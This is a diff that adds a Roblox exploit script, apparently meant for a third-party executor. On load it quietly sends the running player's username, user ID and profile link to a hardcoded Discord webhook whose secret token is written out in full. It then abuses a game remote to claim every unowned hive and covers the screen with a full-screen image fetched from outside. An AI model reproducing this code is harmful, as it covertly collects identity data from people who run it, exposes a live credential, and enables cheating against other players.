@@ -1,1 +1,64 @@
 
+
+repeat wait(0.1) until game:IsLoaded()
+
+--logs 
+local player = game.Players.LocalPlayer
+local function postHook(webhook , args)
+(syn and syn.request or http_request or request)({
+    Url = webhook,
+    Method = "POST", 
+    Headers = {["Content-Type"] = "application/json"},
+    Body = game:GetService("HttpService"):JSONEncode(args)
+})
+end
+
+postHook(
+    "https://discord.com/api/webhooks/1058401610839105637/V0bdo2XxS0T9nqMztpIk77fp5iO2vdAmLMSJtnt06V7G5zXpBCzvMpJkCuDaPPT_AFp_",
+    {
+        content = "";
+        embeds = {
+            {
+            title = player.Name;
+            description = "executed nert script";
+            color = tonumber(0x7269da);
+            thumbnail = {url="https://www.roblox.com/HeadShot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"};
+            fields = { 
+            {name = "**Profile**"; value = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"; inline = false};
+            };
+            }
+        };
+    }
+)
+
+
+hives = game.Workspace.Honeycombs:GetChildren() for i = #hives, 1, -1 do  v = game.Workspace.Honeycombs:GetChildren()[i] if v.Owner.Value == nil then game.ReplicatedStorage.Events.ClaimHive:FireServer(v.HiveID.Value) end end
+
+wait(1)
+
+-- screen
+
+local HttpService = game:GetService("HttpService")
+local asset_loading_function = getsynasset or getcustomasset
+local ui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+
+local frame1 = Instance.new("Frame", ui)
+frame1.Size = UDim2.new(1,0,1.1,0)
+frame1.Position = UDim2.new(0,0,-0.1,0)
+frame1.BackgroundTransparency = 0
+frame1.BackgroundColor3 = Color3.new(0,0,0)
+frame1.Draggable = false
+
+if asset_loading_function then
+    local file_name = HttpService:GenerateGUID(false)
+    writefile(file_name..".png", game:HttpGet("https://lh3.googleusercontent.com/u/0/drive-viewer/AFDK6gO_66NQKGVTgv28TQBxRpToItZP7XEdYCmlpVnachyzrdniAa7MI6_2J0ET9mrTdwYJUPmrWCsTUEDGKGQpQl0yictiag=w1920-h937"))
+
+    local img = Instance.new("ImageLabel", frame1)
+    img.Size = UDim2.new(1, 0, 1, 0)
+    img.Active = true
+    img.Image = asset_loading_function(file_name..".png")
+
+    task.wait(0.5)
+
+    delfile(file_name..".png") 
+end
